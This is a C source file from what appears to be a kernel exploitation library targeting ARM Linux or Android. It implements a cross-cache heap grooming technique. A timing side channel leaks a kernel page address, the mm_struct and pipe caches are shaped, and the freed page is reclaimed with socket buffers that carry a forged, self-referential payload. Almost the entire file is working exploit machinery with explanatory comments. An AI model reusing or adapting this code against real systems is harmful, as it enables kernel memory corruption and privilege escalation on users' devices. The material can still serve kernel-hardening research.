/* lib/spray/crosscache/crosscache.c -- see crosscache.h.
 *
 * The order of operations is the technique. Objects are allocated so a page
 * belongs to them alone; the side channel gives one object's address, and the
 * page is the address with its low bits cleared. Freeing that page puts it at
 * the head of this processor's free list, where the very next allocation of a
 * suitable size takes it -- and that next allocation has to be the caller's,
 * which is why nothing runs in between.
 *
 * The receiving cache is prepared beforehand: its partial pages are drained, so
 * the allocation that follows the free cannot be satisfied from a page the
 * allocator already had, and has to take a fresh one.
 */
#define _GNU_SOURCE
#include "crosscache.h"

#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

/* kernelsnitch.h defaults to __INTEL (x86 identity-map range) unless __ARM is
 * defined before its first include in THIS translation unit -- every other
  * defines it, but this file, compiled as its own TU, did not: the bruteforce
 * silently searched 0xffff888000000000-0xffffc88000000000 (x86) instead of
 * this device's real 0xffffff8000000000+ linear map, so the leak could never
 * find a real address. */
#ifndef __ARM
#define __ARM 1
#endif
#include "../../leak/kernelsnitch/kernelsnitch.h"   /* the timing side channel */
#include "../../addr/physmap.h"                      /* lib_is_direct_ptr (leak sanity) */

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

struct cc_ctx { size_t cnt; pid_t *childs; int *memfds; };

/* ---- module state ---- */
static struct crosscache_cfg cc_cfg;
static struct kernelsnitch_shared_state *cc_ks;
static struct cc_ctx cc_prep, cc_spray, cc_pre, cc_post;
static pid_t cc_leak_child;
static int cc_leak_memfd = -1;
static int (*cc_n)[2], (*cc_c)[2], (*cc_e)[2], (*cc_drain)[2], (*cc_reclaim)[2];
static size_t cc_n_cnt, cc_c_cnt, cc_e_cnt, cc_drain_cnt, cc_reclaim_cnt;
static uintptr_t cc_base;

/* ---- primitives ---- */
/* Pin to the processor whose per-cpu page list the sequence depends on.
 *
 * Which list a freed page lands on, and which list the refill allocates from,
 * is decided by the processor each runs on -- so this is load-bearing, not
 * housekeeping. A caller already confined to a different set (by an outer
 * affinity mask) silently keeps running elsewhere, which changes the result
 * without changing the code, so a refusal is reported once. */
static void cc_pin(int core)
{
	static int complained;
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(core, &set);
	if (syscall(__NR_sched_setaffinity, 0, sizeof(set), &set) && !complained) {
		complained = 1;
		pr_error("crosscache: cannot pin to cpu %d (outer affinity mask?) -- "
			 "the sequence is running on whatever it was already allowed\n", core);
	}
}
static void cc_yield4(void){ sched_yield(); sched_yield(); sched_yield(); sched_yield(); }

static pid_t cc_clone_child(void)
{
	pid_t c = (pid_t)syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
	if (c == 0) { prctl(PR_SET_PDEATHSIG, SIGKILL); if (getppid()==1) _exit(0);
		cc_pin(cc_cfg.core); for(;;) pause(); }
	return c;
}
static int cc_clone_memfd(void)
{
	pid_t c = cc_clone_child();
	char p[64]; snprintf(p, sizeof p, "/proc/%d/mem", c);
	int fd = open(p, O_RDONLY);
	if (c > 0) { kill(c, SIGKILL); waitpid(c, NULL, 0); }
	return fd;
}
static pid_t cc_clone_leak_child(void)
{
	pid_t c = (pid_t)syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
	if (c == 0) { kernelsnitch_find_collisions(cc_ks); _exit(0); }
	return c;
}
static int cc_init_ctx(struct cc_ctx *x, size_t n){ x->cnt=n; x->childs=calloc(n,sizeof(pid_t)); x->memfds=calloc(n,sizeof(int)); return (x->childs&&x->memfds)?0:-1; }
static void cc_fill(struct cc_ctx *x){ for(size_t i=0;i<x->cnt;i++){ x->childs[i]=-1; x->memfds[i]=cc_clone_memfd(); } }

/* pipe object helpers (F_SETPIPE_SZ resizes the pipe_buffer array) */
static void cc_resize(int fd[2], size_t slots){ fcntl(fd[0], F_SETPIPE_SZ, slots*PAGE_SIZE); }
static void cc_make(int fd[2]){ if(pipe(fd)==0) cc_resize(fd, 2); else { fd[0]=fd[1]=-1; } }
static void cc_alloc(int fd[2]){ cc_resize(fd, cc_cfg.pipe_slots); }
static void cc_free(int fd[2]){ cc_resize(fd, 2); }

static int (*cc_make_pipes(size_t n))[2]
{
	int (*a)[2] = calloc(n, sizeof(*a));
	if (!a) return NULL;
	for (size_t i=0;i<n;i++) cc_make(a[i]);
	return a;
}

/* Drain the receiving cache: fill several of its pages, then free one so the
 * strided subset to leave the kmalloc-pipe cache partial in a known shape. */
static void cc_shape_once(void)
{
	size_t ops = cc_cfg.pipe_objs_per_slab;
	for (size_t i=0;i<cc_n_cnt;i++) cc_alloc(cc_n[i]);
	for (size_t i=0;i<cc_c_cnt;i++) cc_alloc(cc_c[i]);
	for (size_t i=0;i<cc_e_cnt;i++) cc_alloc(cc_e[i]);
	for (size_t i=0;i<cc_n_cnt;i+=ops) cc_free(cc_n[i]);
	for (size_t i=0;i<cc_e_cnt;i++) cc_free(cc_e[i]);
	for (size_t i=0;i<cc_c_cnt;i+=ops) cc_free(cc_c[i]);
}

/* one AF_UNIX stream send of skb_send bytes over an already-created socketpair;
 * if `fill`/`fill_len` given, replicate it across the buffer (else 0x50). */
static int cc_send(int sv[2], size_t skb_send, const void *fill, size_t fill_len)
{
	if (sv[0] < 0) return -1;
	unsigned char *b = malloc(skb_send); if (!b) return -1;
	if (!fill || !fill_len) memset(b, 0x50, skb_send);
	else for (size_t o=0;o<skb_send;o+=fill_len) memcpy(b+o, fill, fill_len < skb_send-o ? fill_len : skb_send-o);
	struct iovec io = { .iov_base=b, .iov_len=skb_send };
	struct msghdr m; memset(&m,0,sizeof m); m.msg_iov=&io; m.msg_iovlen=1;
	ssize_t n = sendmsg(sv[0], &m, 0);
	free(b);
	return n<0 ? -1 : 0;
}

/* module-held leak sk_buff: created+sent in crosscache_leak_base (holds base),
 * freed by the chosen reclaim (pipe_reclaim / content_reclaim). */
static int cc_skb_sv[2] = {-1,-1};
static size_t cc_order_size;
static int (*cc_content_sv)[2]; static size_t cc_content_n;

/* Groom and free: allocate the objects, leak one address, free the page
 * page and reclaim it with the module socket buffer so the side channel can
 * leak that page's address. Returns base with cc_skb_sv STILL HOLDING it and the
 * core pinned; the caller's reclaim frees cc_skb_sv and retakes base. When
 * When pipes are requested, every pool is created up front
 * (before any free) for a following crosscache_pipe_reclaim(). */
/* Read the address out of the side channel and reduce it to the page.
 *
 * A mis-leak is the dangerous failure: a value of the right shape that names
 * the wrong page sends every later step somewhere arbitrary. Anything that is
 * not an order-aligned linear-map pointer is rejected here so the caller grooms
 * again instead of building on it. Returns 0 on failure. */
static uintptr_t cc_leaked_object;

static uintptr_t cc_resolve_leak(size_t order_size)
{
	uintptr_t leaked;

	kernelsnitch_bruteforce(cc_ks);
	kernelsnitch_release_threads(cc_ks);
	leaked = (uintptr_t)kernelsnitch_cleanup(cc_ks);
	cc_ks = NULL;
	if (leaked == (uintptr_t)-1 || leaked == 0) {
		pr_error("crosscache: page leak failed\n");
		return 0;
	}
	if (!lib_is_direct_ptr(leaked)) {
		pr_error("crosscache: leaked %#lx not a linear-map ptr (mis-leak) -- rejected\n",
			 (unsigned long)leaked);
		return 0;
	}
	cc_leaked_object = leaked;
	cc_base = leaked & ~((uintptr_t)order_size - 1);
	pr_info("crosscache: leaked=%#lx base=%#lx\n", (unsigned long)leaked,
		(unsigned long)cc_base);
	return cc_base;
}

/* The part every method shares: arrange the object cache so one page is ours
 * alone, park the side channel on it, and free everything that is not it.
 *
 * What follows this point is where the methods disagree -- when the address is
 * taken, and how many times the page changes hands -- so it is deliberately the
 * seam. Returns 0 on success. */
static int cc_groom_prologue(const struct crosscache_cfg *cfg, int with_pipes)
{
	cc_cfg = *cfg;
	cc_order_size = (size_t)PAGE_SIZE << cc_cfg.mm_order;
	size_t order_size = cc_order_size;
	size_t ops = order_size / cc_cfg.mm_struct_sz;           /* mm objs/slab (32) */
	size_t pops = cc_cfg.pipe_objs_per_slab;                  /* pipe objs/slab (16) */
	int cpus = (int)sysconf(_SC_NPROCESSORS_ONLN);

	if (with_pipes) {
		/* pipe-cache shaping pools made 2-slot up front (before any free) so
		 * their fd/inode allocs don't perturb the target page. */
		size_t partial_groups = (cc_cfg.pipe_min_partial + cc_cfg.pipe_cpu_partial - 1) / cc_cfg.pipe_cpu_partial;
		cc_n_cnt = partial_groups * cc_cfg.pipe_cpu_partial * pops;
		cc_c_cnt = cc_cfg.pipe_cpu_partial * pops;
		cc_e_cnt = 2 * pops;
		cc_drain_cnt = pops * cc_cfg.pipe_drain_slabs;
		cc_reclaim_cnt = pops * cc_cfg.pipe_reclaim_slabs;
		cc_n = cc_make_pipes(cc_n_cnt); cc_c = cc_make_pipes(cc_c_cnt); cc_e = cc_make_pipes(cc_e_cnt);
		cc_drain = cc_make_pipes(cc_drain_cnt); cc_reclaim = cc_make_pipes(cc_reclaim_cnt);
		if (!cc_n||!cc_c||!cc_e||!cc_drain||!cc_reclaim) { pr_error("crosscache: pipe alloc failed\n"); return -1; }
	}

	if (cc_init_ctx(&cc_prep, 32*ops) || cc_init_ctx(&cc_spray, (1+cc_cfg.mm_partials)*ops) ||
	    cc_init_ctx(&cc_pre, ops-1) || cc_init_ctx(&cc_post, ops)) { pr_error("crosscache: ctx alloc failed\n"); return -1; }

	cc_fill(&cc_prep);
	cc_fill(&cc_spray);
	cc_ks = kernelsnitch_setup(cc_cfg.mm_struct_sz, cc_cfg.mm_order, cpus, cc_cfg.leak_collisions, 0, 0);
	if (!cc_ks) { pr_error("crosscache: kernelsnitch_setup failed\n"); return -1; }
	cc_fill(&cc_pre);
	cc_leak_child = cc_clone_leak_child();
	cc_fill(&cc_post);
	{ char p[64]; snprintf(p,sizeof p,"/proc/%d/mem",cc_leak_child); cc_leak_memfd = open(p,O_RDONLY); }

	for (size_t i=0;i<cc_pre.cnt;i++)  if(cc_pre.childs[i]>0){ kill(cc_pre.childs[i],SIGKILL); waitpid(cc_pre.childs[i],NULL,0);}
	for (size_t i=0;i<cc_post.cnt;i++) if(cc_post.childs[i]>0){ kill(cc_post.childs[i],SIGKILL); waitpid(cc_post.childs[i],NULL,0);}
	for (size_t i=0;i<cc_spray.cnt;i++)if(cc_spray.childs[i]>0){ kill(cc_spray.childs[i],SIGKILL);waitpid(cc_spray.childs[i],NULL,0);}
	if (cc_leak_child>0) waitpid(cc_leak_child,NULL,0);

	if (!kernelsnitch_found_collisions(cc_ks)) { pr_error("crosscache: collision finding failed\n"); return -1; }
	return 0;
}

/* Reclaim-then-leak.
 *
 * The page is taken with filler bytes first and the address read afterwards,
 * which means the page must change hands a second time before it can carry a
 * payload that names it. Two exchanges instead of one, and the second is the
 * one that has to land. */
static uintptr_t cc_groom(const struct crosscache_cfg *cfg, int with_pipes)
{
	size_t order_size, ops;

	if (cc_groom_prologue(cfg, with_pipes))
		return 0;
	order_size = cc_order_size;
	ops = order_size / cc_cfg.mm_struct_sz;
	(void)ops;

	/* SKB leak: create both socketpairs BEFORE the frees, pcp-shape, free the mm
	 * slab pages, free the leak child's mm, reclaim it with an sk_buff, then
	 * The side channel leaks that page's address; the buffer keeps holding it. */
	int pcp_sv[2]={-1,-1};
	if (socketpair(AF_UNIX,SOCK_STREAM,0,pcp_sv)<0 || socketpair(AF_UNIX,SOCK_STREAM,0,cc_skb_sv)<0) { pr_error("crosscache: socketpair failed\n"); return 0; }
	cc_send(pcp_sv, order_size*2, NULL, 0);
	cc_pin(cc_cfg.core);
	cc_yield4();
	/* Each close here frees one address space and is part of the sequence, so
	 * the order matters. Clearing the slot is what lets cleanup close the ones
	 * this sequence does not, without double-closing the ones it does. */
	for (size_t i=0;i<cc_pre.cnt;i++)  if(cc_pre.memfds[i]>0) { close(cc_pre.memfds[i]); cc_pre.memfds[i]=-1; }
	for (size_t i=0;i+1<cc_post.cnt;i++) if(cc_post.memfds[i]>0) { close(cc_post.memfds[i]); cc_post.memfds[i]=-1; }
	for (size_t i=0;i<cc_spray.cnt;i+=ops) if(cc_spray.memfds[i]>0) { close(cc_spray.memfds[i]); cc_spray.memfds[i]=-1; }
	close(pcp_sv[0]); close(pcp_sv[1]);
	cc_yield4();
	if (cc_leak_memfd>0){ close(cc_leak_memfd); cc_leak_memfd=-1; }
	cc_send(cc_skb_sv, order_size*2, NULL, 0);

	if (!cc_resolve_leak(order_size))
		return 0;
	cc_pin(cc_cfg.core);
	return cc_base;
}

uintptr_t crosscache_leak_base(const struct crosscache_cfg *cfg) { return cc_groom(cfg, 0); }

int crosscache_pipe_reclaim(void)
{
	if (!cc_base || !cc_reclaim) return -1;
	/* The order that matters: prepare the receiving cache, pre-create the drain
	 * pipes, FREE the leak sk_buff (base -> freelist), then alloc reclaim pipes
	 * so one pipe_buffer array lands on base. */
	cc_shape_once();
	for (size_t i=0;i<cc_drain_cnt;i++) cc_alloc(cc_drain[i]);
	cc_pin(cc_cfg.core);
	if (cc_skb_sv[0]>=0){ close(cc_skb_sv[0]); cc_skb_sv[0]=-1; }
	if (cc_skb_sv[1]>=0){ close(cc_skb_sv[1]); cc_skb_sv[1]=-1; }
	for (size_t i=0;i<cc_reclaim_cnt;i++) cc_alloc(cc_reclaim[i]);
	pr_info("crosscache: pipe reclaim done (%zu pipes)\n", cc_reclaim_cnt);
	return 0;
}

uintptr_t crosscache_pipe_base(const struct crosscache_cfg *cfg)
{
	uintptr_t b = cc_groom(cfg, 1);
	if (!b) return 0;
	if (crosscache_pipe_reclaim()) return 0;
	return b;
}

/* Content reclaim: release the buffer holding the page and retake it with a
 * sk_buff carrying `tmpl` (self-referential to base). Content-controlled, so
 * base ends holding the caller's forge bytes. Returns 0/-1. */
int crosscache_content_reclaim(const void *tmpl, size_t len, size_t nspray)
{
	if (!cc_base || len == 0 || len > cc_order_size) return -1;
	if (nspray == 0) nspray = 1;
	/* Pre-create all reclaim socketpairs BEFORE freeing base (socket alloc
	 * perturbs the freelist). Then free base and fire nspray order-N sends: one
	 * retakes the just-freed order-N page (base); the rest land elsewhere and are
	 * harmless (same self-referential forge). More sends -> higher land rate. */
	int (*sv)[2] = calloc(nspray, sizeof(*sv));
	if (!sv) return -1;
	for (size_t i=0;i<nspray;i++) { sv[i][0]=sv[i][1]=-1;
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv[i]) < 0) { pr_error("crosscache: content socketpair failed\n"); free(sv); return -1; } }
	cc_pin(cc_cfg.core);
	if (cc_skb_sv[0]>=0){ close(cc_skb_sv[0]); cc_skb_sv[0]=-1; }
	if (cc_skb_sv[1]>=0){ close(cc_skb_sv[1]); cc_skb_sv[1]=-1; }
	cc_yield4();
	for (size_t i=0;i<nspray;i++) cc_send(sv[i], cc_order_size, tmpl, len);
	/* keep the sends held so base stays occupied; hand back the first pair via
	 * cc_skb_sv and stash the rest (freed at cleanup). */
	cc_skb_sv[0]=sv[0][0]; cc_skb_sv[1]=sv[0][1];
	cc_content_sv = sv; cc_content_n = nspray;
	pr_info("crosscache: content reclaim (%zu bytes x%zu) at base=%#lx\n", len, nspray, (unsigned long)cc_base);
	return 0;
}

void crosscache_reclaim_pipes(int (**fds)[2], size_t *n){ *fds = cc_reclaim; *n = cc_reclaim_cnt; }

/* ---------------------------------------------------------------- methods ---
 *
 * Both take a page the caller owns and refill it from another cache. They
 * disagree on one thing: whether the address is read before or after the page
 * changes hands. Everything else follows from that.
 */

/* Leak-then-take.
 *
 * The address is read while the object is still alive, so the payload can be
 * composed before the page is ever given up and the page changes hands exactly
 * once -- the single exchange is also the one that must land. */
static uintptr_t cc_place_direct(const struct crosscache_request *r)
{
	size_t order_size, ops;
	unsigned char *payload = NULL;
	int pcp_sv[2] = { -1, -1 };
	int (*sv)[2];
	size_t nspray = r->nspray ? r->nspray : 1;

	if (cc_groom_prologue(&r->cfg, 0))
		return 0;
	order_size = cc_order_size;
	ops = order_size / cc_cfg.mm_struct_sz;

	/* Read it now, while the object whose page this is still exists. */
	if (!cc_resolve_leak(order_size))
		return 0;
	/* The victim is still allocated at this point, so a caller that can read
	 * kernel memory can confirm the address names a live object before any of
	 * it is given up. No later moment can show this. */
	if (r->inspect)
		r->inspect(CROSSCACHE_STAGE_LEAKED, cc_leaked_object, cc_base, r->user);

	if (r->compose) {
		payload = malloc(r->send_bytes);
		if (!payload)
			return 0;
		memset(payload, 0, r->send_bytes);
		r->compose(payload, r->send_bytes, cc_base, r->user);
	}

	/* Every allocation the sequence needs is made before the first free, so
	 * that allocating does not disturb the freelist the frees are shaping. */
	sv = calloc(nspray, sizeof(*sv));
	if (!sv) { free(payload); return 0; }
	for (size_t i = 0; i < nspray; i++) {
		sv[i][0] = sv[i][1] = -1;
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv[i]) < 0) {
			pr_error("crosscache: refill socketpair failed\n");
			free(sv); free(payload); return 0;
		}
	}
	if (socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv) < 0) {
		pr_error("crosscache: socketpair failed\n");
		free(sv); free(payload); return 0;
	}
	cc_send(pcp_sv, order_size * 2, NULL, 0);
	cc_pin(cc_cfg.core);
	cc_yield4();
	for (size_t i=0;i<cc_pre.cnt;i++)  if(cc_pre.memfds[i]>0) { close(cc_pre.memfds[i]); cc_pre.memfds[i]=-1; }
	for (size_t i=0;i+1<cc_post.cnt;i++) if(cc_post.memfds[i]>0) { close(cc_post.memfds[i]); cc_post.memfds[i]=-1; }
	for (size_t i=0;i<cc_spray.cnt;i+=ops) if(cc_spray.memfds[i]>0) { close(cc_spray.memfds[i]); cc_spray.memfds[i]=-1; }
	close(pcp_sv[0]); close(pcp_sv[1]);
	cc_yield4();
	/* The page is surrendered here, and retaken by the sends below. */
	if (cc_leak_memfd>0){ close(cc_leak_memfd); cc_leak_memfd=-1; }
	for (size_t i = 0; i < nspray; i++)
		cc_send(sv[i], order_size, payload, payload ? r->send_bytes : 0);

	cc_skb_sv[0]=sv[0][0]; cc_skb_sv[1]=sv[0][1];
	cc_content_sv = sv; cc_content_n = nspray;
	free(payload);
	pr_info("crosscache: direct place x%zu at base=%#lx\n", nspray, (unsigned long)cc_base);
	return cc_base;
}

/* Take-then-leak: the page is held with filler while the address is read, then
 * exchanged a second time for a payload that can name it. */
static uintptr_t cc_place_swap(const struct crosscache_request *r)
{
	unsigned char *payload = NULL;
	uintptr_t base = cc_groom(&r->cfg, 0);
	int rc;

	if (!base)
		return 0;
	/* The page is held by filler here and by nothing else, which is the only
	 * moment at which the address can be checked independently of whether the
	 * payload later lands. */
	if (r->inspect)
		r->inspect(CROSSCACHE_STAGE_HELD, cc_leaked_object, base, r->user);
	if (r->compose) {
		payload = malloc(r->send_bytes);
		if (!payload)
			return 0;
		memset(payload, 0, r->send_bytes);
		r->compose(payload, r->send_bytes, base, r->user);
	}
	rc = crosscache_content_reclaim(payload, r->send_bytes, r->nspray ? r->nspray : 1);
	free(payload);
	return rc ? 0 : base;
}

static const struct crosscache_method cc_method_table[] = {
	{ "swap", "holds the page with filler, reads the address, then exchanges it again",
	  "the caller owns the victim and can free it on its own schedule",
	  cc_place_swap },
	{ "direct", "reads the address while the victim is alive, then gives the page up once",
	  "the caller owns the victim and can read its address before freeing it",
	  cc_place_direct },
};

const struct crosscache_method *crosscache_methods(size_t *count)
{
	if (count)
		*count = sizeof(cc_method_table) / sizeof(cc_method_table[0]);
	return cc_method_table;
}

const struct crosscache_method *crosscache_method_named(const char *name)
{
	size_t n;
	const struct crosscache_method *m = crosscache_methods(&n);

	for (size_t i = 0; name && i < n; i++)
		if (!strcmp(m[i].name, name))
			return &m[i];
	return NULL;
}

uintptr_t crosscache_place_with(const struct crosscache_method *method,
                                const struct crosscache_request *request)
{
	if (!method || !request || !request->send_bytes)
		return 0;
	return method->place(request);
}

void crosscache_cleanup(void)
{
	if (cc_content_sv) { for (size_t i=0;i<cc_content_n;i++){ if(cc_content_sv[i][0]>=0)close(cc_content_sv[i][0]); if(cc_content_sv[i][1]>=0)close(cc_content_sv[i][1]); } free(cc_content_sv); cc_content_sv=NULL; cc_content_n=0; cc_skb_sv[0]=cc_skb_sv[1]=-1; }
	if (cc_skb_sv[0]>=0) close(cc_skb_sv[0]);
	if (cc_skb_sv[1]>=0) close(cc_skb_sv[1]);
	cc_skb_sv[0]=cc_skb_sv[1]=-1;
	int (*pools[])[2] = { cc_n, cc_c, cc_e, cc_drain, cc_reclaim };
	size_t cnts[] = { cc_n_cnt, cc_c_cnt, cc_e_cnt, cc_drain_cnt, cc_reclaim_cnt };
	for (int p=0;p<5;p++) if (pools[p]) { for (size_t i=0;i<cnts[p];i++){ if(pools[p][i][0]>=0)close(pools[p][i][0]); if(pools[p][i][1]>=0)close(pools[p][i][1]); } free(pools[p]); }
	cc_n=cc_c=cc_e=cc_drain=cc_reclaim=NULL;
	/* Close every descriptor the groom opened and the sequence did not.
	 *
	 * The spray holds one open descriptor per sprayed address space -- over a
	 * thousand of them -- and only a fraction are closed as part of the
	 * sequence. Freeing the arrays without closing the rest leaks that many
	 * descriptors per groom, which a consumer that grooms once never notices
	 * and a consumer that grooms twice fails on. */
	struct cc_ctx *ctxs[] = { &cc_prep, &cc_spray, &cc_pre, &cc_post };
	for (size_t c = 0; c < sizeof(ctxs)/sizeof(ctxs[0]); c++) {
		struct cc_ctx *x = ctxs[c];
		if (x->memfds) for (size_t i=0;i<x->cnt;i++) if (x->memfds[i]>0) close(x->memfds[i]);
		/* A child that outlived the sequence would keep its address space
		 * alive, which is the object the next groom is trying to place. */
		if (x->childs) for (size_t i=0;i<x->cnt;i++)
			if (x->childs[i]>0) { kill(x->childs[i],SIGKILL); waitpid(x->childs[i],NULL,0); }
		free(x->childs); free(x->memfds);
		memset(x,0,sizeof(*x));
	}
	if (cc_leak_memfd>0) { close(cc_leak_memfd); cc_leak_memfd=-1; }
	cc_base = 0;
}

int crosscache_stamp_self(void *payload, size_t len, size_t off, uintptr_t base)
{
	uint64_t v = (uint64_t)base;

	if (!payload || off > len || len - off < sizeof(v))
		return -1;
	memcpy((unsigned char *)payload + off, &v, sizeof(v));
	return 0;
}

int crosscache_detach_hold(int out[2])
{
	/* Hand the descriptors that keep the placed page alive to the caller, so a
	 * cleanup before the next groom does not release the page.
	 *
	 * A caller that must keep a placed page reachable across further grooms --
	 * one measuring several placements, or one that aimed a kernel pointer at a
	 * page and has not yet aimed it elsewhere -- needs the page to outlive the
	 * module state that produced it. Releasing it early leaves that pointer on
	 * freed memory. */
	if (cc_skb_sv[0] < 0 && cc_skb_sv[1] < 0)
		return -1;
	out[0] = cc_skb_sv[0];
	out[1] = cc_skb_sv[1];
	cc_skb_sv[0] = cc_skb_sv[1] = -1;
	/* The array that recorded them is the module's; the descriptors are now the
	 * caller's, so drop the rest of the array without closing the pair. */
	if (cc_content_sv) {
		for (size_t i=0;i<cc_content_n;i++) {
			int a = cc_content_sv[i][0], b = cc_content_sv[i][1];
			/* The handed-over pair is one of these entries; close every other
			 * one. Both members are compared because which entry holds the
			 * placed page is the reclaim's choice, not this function's. */
			if (a==out[0]||a==out[1]||b==out[0]||b==out[1]) continue;
			if (a>=0) close(a);
			if (b>=0) close(b);
		}
		free(cc_content_sv); cc_content_sv=NULL; cc_content_n=0;
	}
	return 0;
}

uintptr_t crosscache_place(const struct crosscache_cfg *cfg,
			   const void *tmpl, size_t len, size_t nspray,
			   const struct crosscache_verify *verify,
			   unsigned attempts, struct crosscache_report *report)
{
	struct crosscache_report r;
	unsigned char seen[256];

	memset(&r, 0, sizeof(r));
	if (attempts == 0)
		attempts = 1;
	/* Without a verifier there is nothing to retry on: a second attempt
	 * would be as blind as the first and would only free the page the
	 * caller may already be relying on. */
	if (!verify || !verify->read)
		attempts = 1;
	if (verify && verify->probe_len > sizeof(seen)) {
		pr_error("crosscache: probe of %zu bytes exceeds the read buffer\n",
			 verify->probe_len);
		return 0;
	}

	for (unsigned i = 0; i < attempts; i++) {
		uintptr_t base;

		r.attempts++;
		base = cc_groom(cfg, 0);
		if (!base) {
			/* No address at all: either the leak failed or it named
			 * something that is not a linear-map pointer. The groom
			 * reports which; both mean nothing was placed. */
			r.mis_shaped++;
			continue;
		}
		r.leaks++;
		r.base = base;
		if (crosscache_content_reclaim(tmpl, len, nspray)) {
			pr_warning("crosscache: reclaim failed at %#lx\n", (unsigned long)base);
			continue;
		}
		if (!verify || !verify->read) {
			r.unverified++;
			if (report)
				*report = r;
			return base;
		}
		if (verify->read(verify->ctx, base + verify->probe_off, seen,
				 verify->probe_len) != 0) {
			pr_warning("crosscache: could not read back %#lx\n", (unsigned long)base);
			continue;
		}
		if (memcmp(seen, verify->expect, verify->probe_len) == 0) {
			r.landings++;
			if (report)
				*report = r;
			pr_success("crosscache: confirmed at %#lx after %u attempt(s)\n",
				   (unsigned long)base, r.attempts);
			return base;
		}
		/* The page is not ours. Whatever is there was not placed by
		 * this run, so the address is discarded rather than written to,
		 * and the next attempt grooms afresh. */
		crosscache_cleanup();
	}

	if (report)
		*report = r;
	pr_warning("crosscache: no confirmed placement in %u attempt(s) "
		   "(%u leaked, %u mis-shaped)\n", r.attempts, r.leaks, r.mis_shaped);
	return 0;
}
